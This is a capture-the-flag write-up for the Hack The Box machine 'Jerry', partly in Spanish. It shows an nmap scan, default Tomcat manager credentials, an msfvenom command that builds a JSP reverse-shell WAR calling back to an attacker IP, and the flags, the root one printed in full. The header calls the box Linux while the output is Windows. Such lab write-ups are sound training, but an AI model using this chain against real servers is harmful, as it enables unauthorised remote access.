---
title: Jerry
date: 2025-12-9 10:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, jerry ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/59f03a24178dbb2bdc94968c201e21f8.png
    alt: Hack The Box
---

> Jerry
Linux · Easy 

## Task 1

Which TCP port is open on the remote host?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- -sCVS -T 5 --min-rate 500 10.129.136.9 -vv    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 12:07 CET
NSE: Loaded 157 scripts for scanning.
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON          VERSION
8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

NSE: Script Post-scanning.
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.31 seconds
           Raw packets sent: 131124 (5.769MB) | Rcvd: 51 (2.228KB)
```

> 8080

## Task 2

Which web server is running on the remote host? Looking for two words.

> Apache Tomcat

## Task 3

Which relative path on the webserver leads to the Web Application Manager?

Si entramos a la web vamos a encontrar el siguiente enlace http://10.129.136.9:8080/manager/html que nos pedirá credneciales

> /manager/html

## Task 4 

What is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username:password

Al intentar loguearnos nos redirige a una página que nos muestra las credenciales 

``` html
<role rolename="admin-gui"/>
<user username="tomcat" password="s3cret" roles="admin-gui"/>
```

> tomcat:s3cret

## Task 5

Which file type can be uploaded and deployed on the server using the Tomcat Web Application Manager?

Al acceder a List Applications vemos que nos permite subir archivos WAR

> WAR


## Submit the flag located on the user's desktop.

``` shell
┌──(pmartinezr㉿kali)-[~/htb/blue]
└─$ msfvenom --list payloads | grep jsp          
    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell

┌──(pmartinezr㉿kali)-[~/htb/jerry/proyect_war]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.224 LPORT=4444 -f war > shell.war
Payload size: 1090 bytes
Final size of war file: 1090 bytes
```
Generamos una reverse shell adecuada a Tomcat con msvenom. 

``` shell
C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

c:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt
type "2 for the price of 1.txt
"user.txt
7004dbcef0f854e************

root.txt
04a8b36e1545a455************
```
> 7004dbcef0f854e************

## Submit the flag located on the administrator's desktop.

> 04a8b36e1545a455393d067e772fe90e

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/144)